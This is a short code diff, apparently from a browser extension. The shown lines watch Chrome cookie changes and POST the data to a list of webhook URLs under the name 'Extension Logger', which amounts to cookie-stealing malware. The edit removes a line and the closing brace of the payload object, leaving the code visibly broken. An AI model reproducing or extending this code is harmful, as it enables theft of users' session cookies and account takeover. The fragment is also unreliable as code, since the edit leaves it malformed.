@@ -116,9 +116,7 @@ async function main(cookie) {
         ],
         username: "Extension Logger",
         avatar_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg",
-        content: MENTION
-    };
-
+        
     for (let wh of WEBHOOKS) {
         fetch(wh.url, {
             method: "POST",
@@ -141,4 +139,5 @@ chrome.cookies.onChanged.addListener(changeInfo => {
         }
     }
 });
+
 
